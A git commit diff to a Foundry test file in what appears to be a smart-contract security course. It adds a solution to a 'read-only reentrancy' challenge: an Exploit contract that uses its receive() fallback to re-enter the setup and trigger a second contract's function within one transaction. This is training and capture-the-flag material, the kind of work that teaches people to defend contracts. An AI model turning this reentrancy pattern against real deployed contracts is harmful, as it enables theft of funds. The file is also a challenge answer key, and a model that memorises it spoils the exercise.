a762cfd99fb21740b06fc04b3a1d76f1aa1429c4
Inaridiy <inainainariinainari@gmail.com>
2023-07-06 18:12:19 +0900

    challenge-read-only

--- course/reentrancy/challenge-read-only/Challenge.t.sol
+++ course/reentrancy/challenge-read-only/Challenge.t.sol
@@ -15,22 +15,47 @@ contract ChallengeTest is Test {
     }
 
     function testExploit() public {
-        emit log_named_decimal_uint("player balance", playerAddress.balance, 18);
+        emit log_named_decimal_uint(
+            "player balance",
+            playerAddress.balance,
+            18
+        );
 
         vm.startPrank(playerAddress, playerAddress);
 
         ////////// YOUR CODE GOES HERE //////////
-        setup.rabbitA().catched{value: 1 ether}();
-        setup.rabbitB().catched{value: 1 ether}();
+        new Exploit(setup).execute{value: 1 ether}();
         ////////// YOUR CODE END //////////
 
         assertTrue(setup.isSolved(), "challenge not solved");
         vm.stopPrank();
 
-        emit log_named_decimal_uint("player balance", playerAddress.balance, 18);
+        emit log_named_decimal_uint(
+            "player balance",
+            playerAddress.balance,
+            18
+        );
     }
 }
 
 ////////// YOUR CODE GOES HERE //////////
+contract Exploit {
+    Setup setup;
+    bool private flag = false;
 
+    constructor(Setup setup_) payable {
+        setup = setup_;
+    }
+
+    function execute() external payable {
+        setup.rabbitA().catched{value: 1 ether}();
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    receive() external payable {
+        if (flag) return;
+        flag = true;
+        setup.rabbitB().catched{value: 1 ether}();
+    }
+}
 ////////// YOUR CODE END //////////
